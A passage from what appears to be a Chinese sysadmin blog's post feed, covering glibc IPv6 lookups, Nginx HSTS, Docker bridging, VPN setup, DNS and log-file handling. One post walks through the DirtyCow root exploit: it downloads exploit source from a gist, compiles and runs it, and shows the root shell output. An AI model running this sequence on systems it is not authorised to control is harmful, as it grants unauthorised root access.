&#125;		inet_ntop (res-&gt;ai_family, ptr, addrstr, 100);		printf ("IPv%d address: %s (%s)\n", res-&gt;ai_family == PF_INET6 ? 6 : 4,				addrstr, res-&gt;ai_canonname);		res = res-&gt;ai_next;	&#125;	return 0;&#125;	intmain (int argc, char *argv[])&#123;	if (argc &lt; 2)		exit (1);	return lookup_host (argv[1]);&#125;
测试程序运行安装软件debuginfo-install glibc-2.12-1.166.el6_7.3.x86_64;
这里因为我的 glibc 版本是 2.12-1.166.el6_7.3
编译参数gcc -g -o g getaddrinfo.c;# 运行，gdb 调试gdb ./g
break mainrun www.a.shifen.com# 再一步步跟吧
gdb跟踪发现在 glibc 源代码里，/usr/src/debug/glibc-2.12-2-gc4ccff1/sysdeps/posix/getaddrinfo.c 文件中第 2436 行和 2437 行：
if (in6ai != NULL)   qsort (in6ai, in6ailen, sizeof (*in6ai), in6aicmp);
这里的第 2437 行的函数 qsort 就是用来做排序的，前面的判断条件 in6ai != NULL 在有 IPv6 的环境里成立；反之在仅有 IPv4 的环境里不成立。这也就是干掉 IPv6 会直接规避掉这个大“坑”的直接原因。
]]></content>
      <tags>
        <tag>IPv6</tag>
        <tag>getaddrinfo</tag>
        <tag>gethostbyname</tag>
        <tag>glibc</tag>
        <tag>IPv4</tag>
        <tag>rfc3484</tag>
        <tag>gai.conf</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx 下启用 HSTS</title>
    <url>/2018/01/Nginx%20%E4%B8%8B%E5%90%AF%E7%94%A8%20HSTS/index.html</url>
    <content><![CDATA[What is HSTS
HTTP Strict Transport Security (HSTS) is a web security policy mechanism which helps to protect websites against protocol downgrade attacks and cookie hijacking. It allows web servers to declare that web browsers (or other complying user agents) should only interact with it using secure HTTPS connections,[1] and never via the insecure HTTP protocol. HSTS is an IETF standards track protocol and is specified in RFC 6797.


The HSTS Policy is communicated by the server to the user agent via an HTTPS response header field named “Strict-Transport-Security”.[2] HSTS Policy specifies a period of time during which the user agent should only access the server in a secure fashion.[3]

以上来自于维基百科
大概意思是说 HSTS 是一个 web 安全策略装置，用于保护 web 站点免受协议降级攻击和 cookie 劫持。

具体实现是在用户代理和 https 站点之间通讯时，通过服务器端发出来的 HTTPS response 头信息：“Strict-Transport-Security” 来实现的。
Why为什么要做 HSTS？当然是为了安全。尤其是天朝这网络环境，无良运营商比比皆是，动辄给你劫持、篡改，为了避免这些无聊无耻人等的捣乱，推荐启用全站 HTTPS 并启用 HSTS。
Howto鉴于 web server 阵营大多已经都是 Nginx 了，这里也就讲下在 Nginx 中怎么启用 HSTS。
其实很简单：就是用 add_header 在 response 中添加一个“Strict-Transport-Security” 头嘛。说起来简单，但实际做起来还是有些弯弯道道的。
配置文件 inc/HSTS.conf单独做一个配置文件：inc/HSTS.conf，内容如下：
add_header Strict-Transport-Security "max-age=300; includeSubDomains" always;
上面配置大致解释下：

max-age：缓存的时间，单位为妙
includeSubDomains：所有子域名都有效
还有个参数 preload，这里没设置，这是更狠一点的 HSTS 用法，稍后再讲
always：这其实是 add_header 的参数，意思是所有返回值的头都包含这个头信息（缺省是只有 200 等返回值才会带这个头的）

在合适的位置 include 这个配置文件然后在虚拟机的配置文件中的合适位置 include 这个配置文件。这个就有学问了，注意以下两点：

在 HTTPS 的 server 块里 include 这个配置文件
有的文章里说要在 HTTP 的 server 块里也要 include 这个配置文件，我仔细查了下 rfc，确定是不需要的


如果这个 server 的配置块里的某个 location 中有其他 add_header 语句，那么在这个 location 的配置里也需要 include 这个配置文件
这是因为 nginx 中 add_header 命令的继承特性导致的，一般是会继承的，但是当某个 location 块中有其他 add_header 语句的话，上层的 add_header 指令不会被继承。



进阶话题前面有提到的参数 preload，的确有个功能叫 preload，大概意思是，有个数据库，其中的网站都是启用 HSTS 的，而一些主流浏览器都内置了对这个库的支持，所以呢，如果有人用这些浏览器访问这些网站，http 协议会直接内部强制转换成 https！
怎样把自己的网站域名加入到这个库里呢？

要在自己网站上设置 http 到 https 的跳转
要在自己网站 https 启用 HSTS
要启用 preload 参数
max-age 要长于一年
要有 includeSubDomains 参数


然后提交就好了（https://hstspreload.org）

]]></content>
      <tags>
        <tag>https_proxy</tag>
        <tag>Nginx</tag>
        <tag>HSTS</tag>
        <tag>HTTPS</tag>
        <tag>HTTP</tag>
        <tag>add_header</tag>
        <tag>Strict-Transport-Security</tag>
      </tags>
  </entry>
  <entry>
    <title>Pipework在CoreOS上的一个小bug</title>
    <url>/2016/12/Pipework%E5%9C%A8CoreOS%E4%B8%8A%E7%9A%84%E4%B8%80%E4%B8%AA%E5%B0%8Fbug/index.html</url>
    <content><![CDATA[Intro某日办公室要断电维护，作为 IT 狗需要在断电之前把办公室的服务器都停掉，来电后再把这些服务器启起来，其中有台服务器，跑的是 CoreOS 系统，上面一堆的 docker container。系统起来后，我发现这些 docker container，一个都不通，显然，踩着大坑了……

环境
CoreOS stable (1185.5.0)
4.7.3-coreos-r3
ip utility, iproute2-ss150210
Pipework 20150123

现象简言之，就是用 net=none 启动的 docker 实例，用 Pipework 配置 ip 地址后 ping 不通，用代码表示是这样的：
docker run -i -t -d \	--name=test \	-h test \	--net none \	centos:6;sudo pipework br0 \	-i eth0 \	test \	10.0.0.3/24@10.0.0.1;# br0 是桥，ip 地址是 10.0.0.2# enp0s25 是直接在 10.0.0.0/24 网段的物理设备# enp0s25 同时是桥 br0 的一个 interface# eth0 是 docker 的网卡设备名# 这个测试 docker 的 ip 地址是 10.0.0.3# 10.0.0.0/24 的网关是 10.0.0.1
结果 10.0.0.0/24 段的其他机器上 ping 不通 10.0.0.3，
docker exec -it test /bin/bash
进入 docker 实例 test 内部以后也 ping 不通网关 10.0.0.1
原因最早怀疑是 proxy_arp 的问题，但实际证明不是，最后发现是由于 docker 建立的 veth 设备（宿主机这端的）没有正确添加到桥设备 br0 里去，从而导致怎么都不通。
解决起来也很简单，直接用
sudo brctl addif br0 vethlxxx# vethlxxx 是这个 docker 实例在宿主机侧的网络设备
然后就通了。
分析问题找到表面原因容易，可为什么没能正确把 vethlxxx 设备加到桥设备 br0 里去呢？也不是第一次跑 Pipework 了，以前一直是好的。
看了看 Pipework 的代码，并调试执行了几遍，发现这个问题不是百分百出现的，只是有很大一部分概率。
最后大概定位问题在 Pipework 的这几句代码上：
(ip link set "$LOCAL_IFNAME" master "$IFNAME" &gt; /dev/null 2&gt;&amp;1) \	|| (brctl addif "$IFNAME" "$LOCAL_IFNAME")
和后面的
ip link set "$LOCAL_IFNAME" up
为什么这么说呢，因为在附录的那个链接里，有段话说道：

To add an interface (e.g. eth0) into the bridge, its state must be up:

这也就是说将某个 interface 加入到桥设备之前，必须要先保证这个 interface 的状态是 up 的，但显然在 Pipework 这份代码里不是这样的，这里是先加入到 br0，然后再将这个 interface 设置为 up 的。
为了证明这个，写了一段 bash 脚本，来模拟这个情况，具体如下（文件名叫 test.sh）：
#!/bin/bashset -xIFNAME="brtest"MTU=1500(ip link add dev "$IFNAME" type bridge ) \	|| (brctl addbr "$IFNAME")ip link set "$IFNAME" upfor i in &#123;10..90&#125;; do	LOCAL_IFNAME="vethltest$&#123;i&#125;"	GUEST_IFNAME="vethgtest$&#123;i&#125;"	ip link add name "$LOCAL_IFNAME" \		mtu "$MTU" type veth \		peer name "$GUEST_IFNAME" \		mtu "$MTU"#	ip link show "$LOCAL_IFNAME"	if (($&#123;i&#125;%2)); then		ip link set "$LOCAL_IFNAME" down	else		ip link set "$LOCAL_IFNAME" up	fi	(ip link set "$LOCAL_IFNAME" master "$IFNAME") \		|| (brctl addif "$IFNAME" "$LOCAL_IFNAME")	ip link set "$LOCAL_IFNAME" updone
在 CoreOS 上执行：
chmod +x test.sh # 这句执行一遍即可sudo ./test.sh
最后再
brctl show brtest
看结果，发现：

vethltest${i}（i 为偶数的设备）都被正确添加到 brtest 里
vethltest${i}（i 为奇数的设备）有一些没有被正确添加到 brtest 里

结论：
在我所测试的平台（CoreOS）上，Pipework 是有问题的，原因来自于调用的命令 ip（来自于软件包 iproute2）
多说一句随后我把测试程序 test.sh 拷贝到一台 CentOS 7 上跑，发现 CentOS 7 没有这个问题。
Appendix参考了一些网上的文档：

Network bridge

]]></content>
      <tags>
        <tag>Pipework</tag>
        <tag>CoreOS</tag>
        <tag>docker</tag>
        <tag>ip</tag>
        <tag>brctl</tag>
        <tag>iproute2</tag>
      </tags>
  </entry>
  <entry>
    <title>VIM普通用户保存文件时用sudo获取root权限</title>
    <url>/2017/03/VIM%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E4%BF%9D%E5%AD%98%E6%96%87%E4%BB%B6%E6%97%B6%E7%94%A8sudo%E8%8E%B7%E5%8F%96root%E6%9D%83%E9%99%90/index.html</url>
    <content><![CDATA[原文来自于 commandlinefu，具体链接找不到了。
原文是这样解释这个命令地做用的：在vim中保存正在编辑的文件而不需要必要的权限（Save a file you edited in vim without the needed permissions）。

下面我们就具体解释一下这条命令是怎样做到保存文件而不需要必要的权限的
:w !sudo tee %
百分号 (“%”) 代表当前文件名，这条命令的含义是把当前编辑的文件的内容当做标准输入输出到命令 sudo tee 文件名的文件里去，也就是 sudo 保存为当前文件名。这个功能其实可能 Debian 和 Ubuntu 的用户更需要一些，因为我们 RedHat 系都是直接 root 干活儿：）
]]></content>
      <categories>
        <category>Code</category>
      </categories>
      <tags>
        <tag>Bash</tag>
        <tag>commandlinefu</tag>
        <tag>Vim</tag>
      </tags>
  </entry>
  <entry>
    <title>一个网卡多通道没打开导致的诡异故障</title>
    <url>/2017/04/%E4%B8%80%E4%B8%AA%E7%BD%91%E5%8D%A1%E5%A4%9A%E9%80%9A%E9%81%93%E6%B2%A1%E6%89%93%E5%BC%80%E5%AF%BC%E8%87%B4%E7%9A%84%E8%AF%A1%E5%BC%82%E6%95%85%E9%9A%9C/index.html</url>
    <content><![CDATA[背景某公有云 VPC 环境下的云主机，发现之间有一个非常诡异的问题，就是从 A 到 B ping 不通，但是只要从 B ping 一下 A，发现 B ping A 只要一通，原来的从 A ping 到 B 又都马上通了。

现象听包也能明显说明这一点：只要有包从 B 到 A，那么从 A 到 B 马上就通，否则，从 A 到 B，也许永远都不会通！
原因最终发现是因为在 B 上的网卡的多队列支持没有打开，
ethtool -l eth0;
显示网络设备 eth0 的 Combined 预设的是 4，但是当前设置的却只是 1。
ethtool -L eth0 combined 4;
之后呢，问题解决。接着发现最直接的原因是因为我们禁掉了一个公有云这边自己搞得一个自启动的服务，那个服务里会去调整网卡的多队列支持。而且为什么要这么一个服务呢，我猜想是因为这个网卡的队列数其实是 libvirtd 虚拟出来的，这个应该是可以跟虚拟机购买的 CPU 核数相适应的，所以一旦服务器升级 CPU，这个多队列的数目马上就会不一样，所以在启动过程中放一个自动调整的步骤，是非常好的策略。
需要注意的是：执行这条命令时最好在控制台登录操作，或者从另外的网卡连上去做操作。因为这个操作会导致被操作的网络设备闪断一下（类似于先 ifdown 再 ifup）
]]></content>
      <categories>
        <category>System</category>
      </categories>
      <tags>
        <tag>ethtool</tag>
        <tag>eths</tag>
        <tag>nic</tag>
        <tag>channel</tag>
        <tag>Combined</tag>
      </tags>
  </entry>
  <entry>
    <title>一个从 Phabricator 中抓出任务生成周报的东西</title>
    <url>/2018/08/%E4%B8%80%E4%B8%AA%E4%BB%8E%20Phabricator%20%E4%B8%AD%E6%8A%93%E5%87%BA%E4%BB%BB%E5%8A%A1%E7%94%9F%E6%88%90%E5%91%A8%E6%8A%A5%E7%9A%84%E4%B8%9C%E8%A5%BF/index.html</url>
    <content><![CDATA[缘起自然是我司每周都要完成的周报。
背景我司重度依赖“不存在网站”：Facebook 开源出来的项目：Phabricator，我们的每项工作也来自于其中的 Maniphest（不知道是什么语言，不像英语，反正应该就是 task 的意思），每周的工作周报里提到的事情如果有 task 的（一般都有），都还要附上其 task id。
同时，Phabricator 目前的运营公司： Phacility 同时也放出了一套 php 的类似于 SDK 的东西：libphutil，所以我就开始尝试着用 php 来撸一个自动生成、发布周报的东西。
about Pha_WR_SREPha_WR_SRE，不许说项目名称起的很雷人。:(
这个东西怎么做的就不说了，这里主要说下大概实现了哪些功能。
输出的信息输出的信息分三种：“completed”、”ongoing” 和 “other”，分别对应着“已完成”、“未完成”和“其他”。
输出的目标已实现的是四种：

Console
OneNote
Evernote
Phabircator’s Phame

第一种就不用说了，如果在控制台运行，运行结果会被直接输出到控制台的；  
第二种也简单，OneNote 支持用 Email 的方式发布 Note，不过需要先在 OneNote 里设置下发邮件的地址白名单（具体见 README 文件）；  
第三种跟 OneNote 差不多，不过 Evernote 需要一定级别的帐号才支持这种功能，而且他的目标 email 地址是隐藏的，需要自己去找，而且不建议让别人知道；  
第四种是我自己想的，反正 Phabricator 也支持 blog 功能（Phame），不过这个需要先在 Phabricator 中新建一个 blog 获得其的 phid 并配置在 config.ini 中；
macOS对于用 macOS 的用户，这里还有个特殊的新功能：可以直接设置定时运行这个任务。具体方法就是把项目里那个 .plist.example 文件稍稍修改下（也可以不修改），改名去掉“.example”，放到 ~/Library/LaunchAgents 目录下，然后可以用命令：
# load .plist file if U have not change it's namelaunchctl load gs.theyan.phawrsre.plist;# start job manuallylaunchctl launchctl start GenerateReport.job;
]]></content>
      <tags>
        <tag>php</tag>
        <tag>Phabricator</tag>
        <tag>maniphest</tag>
        <tag>task</tag>
        <tag>OneNote</tag>
        <tag>Evernote</tag>
        <tag>phame</tag>
        <tag>macOS</tag>
        <tag>Mojave</tag>
        <tag>launch</tag>
      </tags>
  </entry>
  <entry>
    <title>一次powerdns上某个zone传输失败的问题的解决过程</title>
    <url>/2018/03/%E4%B8%80%E6%AC%A1powerdns%E4%B8%8A%E6%9F%90%E4%B8%AAzone%E4%BC%A0%E8%BE%93%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98%E7%9A%84%E8%A7%A3%E5%86%B3%E8%BF%87%E7%A8%8B/index.html</url>
    <content><![CDATA[缘起我司用 PowerDNS 来维护域名，某天否然发现有纪录在 PowerDNS 已经更新了，但是客户端查询解析结果却迟迟没有更新。
排查问题请求传输数据的一端在用做 dns 查询用的服务器上（也是 PowerDNS），执行：
pdns_control reload;
然后在 log 里看到有错误输出：

Unable to AXFR zone ‘in-addr.arpa’ from remote ‘1.1.1.1’ (resolver): Remote nameserver closed TCP connection

(1.1.1.1 是主 DNS 服务器)
看了些文档，说有可能是数据文件太大导致传输失败，于是有直接测试了一下传输 zone：
dig in-addr.arpa @1.1.1.1 AXFR;
结果发现还是未能得到整个 zone 的数据，于是怀疑服务器端可能有问题。
在传输数据的一端在主 DNS 服务器上（这里应该是 1.1.1.1），查看 log，发现有报错误：

Exception: All data was not consumedTCP Connection Thread died because of STL error: All data was not consumed

仔细看了下文档，说有可能是待传输的 zone 的数据文件有问题，于是我又做了下检测：
pdnsutil check-zone in-addr.arpa;
发现一堆的数据（解析纪录）显然有问题，都备份好，然后删除之。
然后一一回头测试，这回都正常了。
问题根源肯定是大家瞎改反向解析（in-addr.arpa）的数据记录导致的。
]]></content>
      <tags>
        <tag>PowerDNS</tag>
      </tags>
  </entry>
  <entry>
    <title>一次本地提权的实战演练</title>
    <url>/2016/11/%E4%B8%80%E6%AC%A1%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E7%9A%84%E5%AE%9E%E6%88%98%E6%BC%94%E7%BB%83/index.html</url>
    <content><![CDATA[Why开发同学在线上一台公有云的机器上调试系统环境的时候，把 /etc/security/limits.conf 给改坏了，这是第二次改坏这个文件了，具体怎么改坏的，为什么改坏了会导致不能登录我单独来说（先挖坑），我这里只讲现象，这一次改坏的情况还好，只影响 root 用户，普通用户还能登录。于是就想能不能用普通用户本地提权成 root，再去修复文件 /etc/security/limits.conf 

Howtoyum -y install wget gcc;# 安装必需软件su - nagios;# 切换成普通用户（nagios）id;# 测试用户身份权限
系统输出：

uid=500(nagios) gid=500(nagios) groups=500(nagios)

可以看出用户 nagios 是普通用户（uid 和 gid 都是 500）
cd /tmp;# 危险动作在 /tmp 目录下做比较好wget \    https://gist.githubusercontent.com/KrE80r/42f8629577db95782d5e4f609f437a54/raw/71c902f55c09aa8ced351690e1e627363c231b45/c0w.c;# 获取 exploit codegcc -pthread c0w.c -o c0w;# 编译之./c0w;# 执行（exploit code）
系统输出：

  (_)  (o o)___/   @@ `     \    \ ____, //usr/bin/passwd    //    //    ^^    ^^DirtyCow root privilege escalationBacking up /usr/bin/passwd to /tmp/bakmmap 9c9bf000  
madvise 0  
ptrace 0  

再执行：
/usr/bin/passwd;whoami;id;
系统提示：

rootuid=0(root) gid=500(nagios) groups=0(root),500(nagios)  

由此可以看出用户已经变成 root（uid 为 0），主组还是 nagios，但同时也已经是 root 组成员
最后，记得把 /tmp/bak 恢复回去成 /usr/bin/passwd
mv /tmp/bak /usr/bin/passwd;chmod 4755 /usr/bin/passwd;chown root:root /usr/bin/passwd;
参考资料
CVE-2016-5195 (DirtyCow) Local Root PoC

]]></content>
      <tags>
        <tag>CentOS</tag>
        <tag>root</tag>
        <tag>DirtyCow</tag>
        <tag>Linux</tag>
        <tag>exploit</tag>
        <tag>2.6.32</tag>
        <tag>Local</tag>
        <tag>C</tag>
        <tag>c0w.c</tag>
      </tags>
  </entry>
  <entry>
    <title>为 iOS 在 CentOS6.x 上搭建 IPSec(PSK+XAuth) VPN 服务器</title>
    <url>/2016/12/%E4%B8%BA-iOS-%E5%9C%A8-CentOS6-x-%E4%B8%8A%E6%90%AD%E5%BB%BA-IPSec-PSK-XAuth-VPN-%E6%9C%8D%E5%8A%A1%E5%99%A8/index.html</url>
    <content><![CDATA[Intro前面有文章提到过给ios10在ubuntu 14.04上配置IPSec服务器，这里写的是在 CentOS 6.4 环境下的配置。
环境：

OpenVZ
CentOS 6.4
2.6.32-042stab120.11



How toEnable tun device因为这是 OpenVZ 的虚拟机，所以首先要确认系统允许启用 tun 设备。 具体要咨询服务商。
Prerequisite# kernelsysctl -w net.ipv4.ip_forward=1;echo \	&quot;sysctl -w net.ipv4.ip_forward=1&quot; \	&gt;&gt; /etc/rc.local;# firewalliptables -t nat \	-A POSTROUTING \	-s 10.0.0.0/8 \	-o venet0 \	-j MASQUERADE;/etc/init.d/iptables save;

Installationyum -y install \	strongswan \	strongswan-libipsec;

Configurationcat &lt;&lt;EOF &gt;/etc/strongswan/ipsec.secrets: PSK sharekeystringuser1 : XAUTH &quot;password for user1&quot;user2 : XAUTH &quot;password for user2&quot;EOFcat &lt;&lt;EOF &gt;/etc/strongswan/ipsec.confconfig setupconn %default	ikelifetime=60m	keylife=20m	rekeymargin=3m	keyingtries=1	keyexchange=ikev1	left=%defaultroute	leftsubnet=0.0.0.0/0	leftauth=pskconn iOS	right=%any	rightsourceip=10.0.0.0/24	rightauth=psk	rightauth2=xauth	rightdns=8.8.8.8,208.67.220.220,82.200.69.80,4.2.2.2	auto=addEOF# start serviceservice strongswan restart;chkconfig strongswan on;

服务器端的工作到此结束。
Advanced# manual for /etc/strongswan/ipsec.confman 5 strongswan_ipsec.conf;# manual for /etc/strongswan/ipsec.secretsman 5 strongswan_ipsec.secrets;# view service statusstrongswan statusall;# restart servicestrongswan restart;

iOS 设置在 iPhone 上，点击设置–&gt;VPN–&gt;**添加 VPN 配置…**，然后：

类型：IPSec
描述：随便填
服务器：填部署IPSec服务的ip地址或域名
账户：上面的例子中是user1或user2
密码：上面的文件里有
使用证书：不使用证书
秘钥：上面配置文件里有（sharekeystring）

Appendix参考了一些网上的文档：

Test ikev1&#x2F;xauth-psk

]]></content>
      <tags>
        <tag>CentOS</tag>
        <tag>IPSec</tag>
        <tag>PSK</tag>
        <tag>OpenVZ</tag>
        <tag>iOS</tag>
        <tag>iPhone</tag>
        <tag>strongSwan</tag>
        <tag>XAuth</tag>
      </tags>
  </entry>
  <entry>
    <title>从GoDaddy迁出域名的正确姿势</title>
    <url>/2016/10/%E4%BB%8EGoDaddy%E8%BF%81%E5%87%BA%E5%9F%9F%E5%90%8D%E7%9A%84%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF/index.html</url>
    <content><![CDATA[Why为嘛？因为GoDaddy的域名续费太黑了，忽悠转进来时低价，一旦到续费的时候，马上翻番。我等忍受不了，立马用脚投票：换地方！比较了一圈儿，貌似namesilo价钱还比较厚道，于是马上动手：域名迁往namesilo！

How ToGoDaddyMy Products
登录GoDaddy
如下图所示进入My Products页面


Manage点击如下图所示Manage按钮：

Domain settings再找你要转出域名的方框，如下图所示点击右上角齿轮，选“Domain settings”
Additional Settings再拉到这个页面的下方，看到”Additional Settings”部分，这里面有四个地方（下图红色圆圈圈住的地方）过需要点击：

左下那个”Domain lock”一定要关掉
点击右上的”Transfer domain away from GoDaddy”
点击右下的”Get authorization code”，这个authorization code会发到这个域名的管理邮箱里
左上的红圈里的”Auto renew”这个没关系，最好关上

namesilo在namesilo上注册账号，提交transfer你在GoDaddy上要转出的域名的申请，注意：需要用到上面获得的Authorization code
Back to GoDaddy像上面那样，进入My Products页面后，找到如下图所示叫”Transfers”的Tab点进去以后，会发现你的域名被请求转出，你需要在点击Accept确认。
Done最后的结果：转过来的费用加上一年的托管费再加上一堆免费的服务，所花的价钱仅仅是在GoDaddy续一年费用的一半！
The End最后，做个广告：如果您看了我的文章感觉对您有帮助，而您又对namesilo感兴趣，那么请点击我给的链接（后面带有我的affiliate id，您懂的），谢谢！

namesilo首页
namesilo搜索页面
namesilo价格列表

]]></content>
      <tags>
        <tag>GoDaddy</tag>
        <tag>namesilo</tag>
        <tag>transfer</tag>
        <tag>domain</tag>
      </tags>
  </entry>
  <entry>
    <title>从apt-get出抓取binary-i386/Packages.gz失败的错误说开去</title>
    <url>/2018/05/%E4%BB%8Eapt-get%E5%87%BA%E6%8A%93%E5%8F%96binary-i386-Packages-gz%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%94%99%E8%AF%AF%E8%AF%B4%E5%BC%80%E5%8E%BB/index.html</url>
    <content><![CDATA[起因服务器上用 apt-mirror 来拉取某些软件官方的 apt 仓并本地建仓，用于本地服务器的软件安装和更新，这个大概也是众多运维工程师曾经做过的事情吧。
今天我在某一台服务器上做 apt-get update 时出错了，系统报 “http://xxx.xx.xx.xx/xxxxxxxxxxxxxxxxxxx/binary-i386/Packages.gz” 抓取失败。xxx.xx.xx.xx 是我自己建的 apt 仓，用来服务于内部服务器的，xxxxxxxxxxxxxxxxxxx 正是自建仓的路径，这下面当然没有 binary-i386 目录，因为服务器都是 x86_64 架构的，应该使用的是目录 binary-amd64 才对。
环境介绍出错的服务器的操作系统是：Ubuntu 16.04.5 LTS (GNU/Linux 4.15.0-13-generic x86_64)

apt 的配置文件里没有关于 i386 的设置
source 里也没有关于 i386 的设置

原因简介Ubuntu 的 amd64 系统中，i386 是作为额外的体系结构被支持的。证据如下：
dpkg --print-architecture;dpkg --print-foreign-architectures
会输出“amd64”和”i386”。
所以 apt 缺省是希望 apt 仓也同时能提供 i386 的软件包。而我用 apt-mirror 建仓时，没有指定同步抓取 i386 的软件包，故而当服务器来抓取 i386 相关数据时会出错（因为的确没有哇）。
解决方法知道原因了以后解决起来相对就简单了，在 apt-mirror 的配置文件 /etc/apt/mirror.list 中将想要同步抓取的软件多写一行，用 deb-i386 替换 deb，然后再跑下 
apt-mirror
就会同时同步 i386 的软件包下来，这样客户端 apt-get 时就不会有错了。
进阶阅读可以让 x86_64 系统架构的服务器仅安装 amd64 的软件吗？这样 apt-get 时也不会去抓群 i386 相关的东西了，这样的话也可以避免上面的错误。
回答是：当然可以！
首先，干掉系统现有的所有 i386 的软件包apt-get purge ".*:i386"
接着，将 i386 从支持的体系结构里删掉dpkg --remove-architecture i386
这样也可以达到目的！ 
]]></content>
      <tags>
        <tag>Ubuntu</tag>
        <tag>apt-get</tag>
        <tag>dpkg</tag>
      </tags>
  </entry>
  <entry>
    <title>使用VIM给文件添加密码保护</title>
    <url>/2017/03/%E4%BD%BF%E7%94%A8VIM%E7%BB%99%E6%96%87%E4%BB%B6%E6%B7%BB%E5%8A%A0%E5%AF%86%E7%A0%81%E4%BF%9D%E6%8A%A4/index.html</url>
    <content><![CDATA[来源方案来自于 Add Password Protection to a file your editing in vim.
具体方法vim -x &lt;filename&gt;
或者在 vim 编辑器里：
:X

注意需要注意的是缺省使用的加密方式是 zip，这个据说比较弱，所以我们通过修改自己的 .vimrc 来指定别的更强一些的加密方式，例如 blowfish(vim 7.3 以上版本支持) 或 blowfish2(vim 7.4 以上版本支持)：
echo "set cryptmethod=blowfish" &gt;&gt; ~/.vimrc
或者直接命令行：
vim -x +"set cm=blowfish" &lt;FILENAME&gt;
使用场景
可以用 vim 来做密码管理器（结合密码文件放 git 上）

]]></content>
      <categories>
        <category>System</category>
      </categories>
      <tags>
        <tag>commandlinefu</tag>
        <tag>Vim</tag>
        <tag>cryptmethod</tag>
        <tag>blowfish</tag>
        <tag>zip</tag>
      </tags>
  </entry>
  <entry>
    <title>从一次用cat空文件到log文件来清log方法的失败说开去</title>
    <url>/2016/11/%E4%BB%8E%E4%B8%80%E6%AC%A1%E7%94%A8cat%E7%A9%BA%E6%96%87%E4%BB%B6%E5%88%B0log%E6%96%87%E4%BB%B6%E6%9D%A5%E6%B8%85log%E6%96%B9%E6%B3%95%E7%9A%84%E5%A4%B1%E8%B4%A5%E8%AF%B4%E5%BC%80%E5%8E%BB/index.html</url>
    <content><![CDATA[发现问题最近在“不务正业”，应老板需求，给我极的极 go 写一个插件，方便公司员工方便地登录 VPN。关于这个插件的事情另外单说，我这里主要讲下开发、调试这个插件期间发现的另外一个问题。
我在 OpenVPN 服务器上编写认证鉴权程序的时候，需要频繁查看 OpenVPN 的日志，我的 OpenVPN 日志文件是用参数 log 而非 log-append 指定的。

某日，我基于以下几个原因想把日志文件不停服务清一下：

文件很大，不方便打开来看
日志打的很细，所以增长很快
自己要的日志特征也不明显，不方便用 grep 来过滤

所以，基于 Linux 系统管理员的基本常识，直接
: &gt; log;
但是当我 1 秒钟后（几乎也就是马上）
ls -l log;
发现这个文件的大小比清之前又大了一些！然后又做过几次测试，具体就不赘述了，反正现象就是：当清 log 的当时，文件大小是变为 0 了的，但是几乎是马上，文件立马又恢复到清之前的大小还大一点，仿佛就是跟没有执行清除 log 文件操作一样！
分析原因最早我以为是内容没有及时刷到硬盘上的原因，于是在清日志操作前后加上了
sync;
结果发现还是一样的。于是就大概网上扫了下，发现是日志文件 log 的打开方式所致。具体情况我们通过一点实验来演示下：
exec 3&gt;log;# 用文件描述符33来打开文件 logprintf zzz &gt;&amp;3;# 把字符串 "zzz" 写入文件描述符 33 打开的文件（也就是文件 log）# 注意：此时的光标在文件的第四个位置（最右边那个字母 "z" 的右边）ls -l log;od -c log;# 查看文件大小及其内容
系统输出：

-rw-r–r– 1 root root 3 Nov 23 16:00 log0000000   z   z   z0000003

可以看到，文件 log 的大小是 3 字节、内容为 “zzz”，接着做：
printf aaaa &gt;&gt; log;# 通过另外一个文件描述符打开文件 log，# 并在其后追加了字符串 "aaaa"# 注意：这里并没有修改文件描述符 3 光标的位置！# 文件描述符 3 的光标还在第四个字符的位置# 也就是最左边那个字符 "a" 的位置ls -l log;od -c log;# 再次查看文件 log 的大小和内容
系统输出：

-rw-r–r– 1 root root 7 Nov 23 16:11 log0000000   z   z   z   a   a   a   a0000007

由此可知现在文件 log 的大小为 7 字节，内容是 “zzzaaaa”，再接着做实验：
printf bb &gt;&amp;3;# 在文件描述符 3 的光标位置开始写入字符串 "bb"# 注意：写完后光标到了第 6 个字符的位置# 也就是左边那个字符 "a" 的位置ls -l log;od -c log;# 再次查看文件 log 的大小和内容
系统输出：

-rw-r–r– 1 root root 7 Nov 23 16:19 log0000000   z   z   z   b   b   a   a0000007

表示此时文件 log 的大小没变，但是内容变成了 “zzzbbaa”，接着要清 log 了：
: &gt; log;# 清空文件 log 的内容ls -l log;od -c log;# 看文件 log 的大小和内容
系统输出：

-rw-r–r– 1 root root 0 Nov 23 16:26 log0000000

可以看出，文件 log 的大小变为 0，内容是空的，再接着看如果此时再通过文件描述符 3 写入内容会怎么样：
printf x &gt;&amp;3;# 通过文件描述符 3 再次写入字符 "x"ls -l log;od -c log;# 看文件 log 的大小和内容
系统输出：

-rw-r–r– 1 root root 6 Nov 23 16:32 log0000000  \0  \0  \0  \0  \0   x0000006

看到没有，新写入的字符 “x” 直接写到了文件描述符 3 的光标位置，整个文件 log 的大小也还是通过文件描述符 3 写入的大小。这个实验应该完美地解释了前面我提到的日志文件的问题。实验最后，别忘了关闭文件描述符 3：
exec 3&gt;&amp;-;rm -f log;
延展话题其实在 /proc 下能看到每个文件描述符打开文件时的参数，当然命令 lsof 也可以看到相关信息。来个实例：
lsof -nP +f g | grep -E log$;
基于敏感信息原因系统输出就不贴了，我只把输出大概讲一下：

FILE-FLAG 列的 W 代表写入
FILE-FLAG 列的 AP 代表 O_APPEND
FILE-FLAG 列的 LG 代表 O_LARGEFILE

可以看出，大部分日志的打开方式都是有 AP 字样的，也就是说打开时是有 O_APPEND 参数的，这种日志文件直接用 :&gt;log 清是没有问题的，但是 OpenVPN 的这几个日志文件就不带 AP，所以这些个日志文件是不能用 :&gt;log 来清。
参考
Emptying a file without disrupting the pipe writing to it

]]></content>
      <tags>
        <tag>CentOS</tag>
        <tag>Linux</tag>
        <tag>OpenVPN</tag>
        <tag>log</tag>
        <tag>log-append</tag>
        <tag>O_APPEND</tag>
        <tag>O_WRONLY</tag>
        <tag>O_LARGEFILE</tag>
      </tags>
  </entry>
  <entry>
    <title>使用racadm远程配置idrac卡自己通过smtp报警</title>
